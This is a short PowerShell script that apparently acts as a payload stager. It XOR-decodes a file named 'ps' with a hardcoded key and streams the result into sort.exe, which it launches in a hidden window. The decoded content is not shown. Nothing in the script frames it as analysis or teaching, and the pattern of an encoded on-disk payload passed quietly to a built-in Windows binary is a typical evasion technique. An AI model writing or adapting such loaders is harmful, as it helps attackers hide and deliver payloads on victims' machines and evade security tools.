function XorDecrypt([Byte[]] $inputBytes) {
    [Byte[]] $key = New-Object Byte[] 0
    $key += @(0x3e, 0xc3, 0x6f, 0xd6, 0x49, 0xce, 0x08, 0x3f, 0xb6, 0x1e, 0x13, 0xcd)
    for ($i = 0; $i -lt $inputBytes.Count; $i++) {
        $inputBytes[$i] = $inputBytes[$i] -bxor $key[$i % $key.Count]
    }
    return $inputBytes
}
$process = New-Object Diagnostics.Process
$process.StartInfo.FileName = "sort.exe"
$process.StartInfo.Arguments = "-"
$process.StartInfo.UseShellExecute = $false
$process.StartInfo.RedirectStandardInput = $true
$process.StartInfo.CreateNoWindow = $true
$process.Start() | Out-Null
$obfuscatedBytes = [IO.File]::ReadAllBytes("ps")
$deobfuscatedBytes = XorDecrypt $obfuscatedBytes
$process.StandardInput.BaseStream.Write($deobfuscatedBytes, 0, $deobfuscatedBytes.Count)
$process.StandardInput.Close()
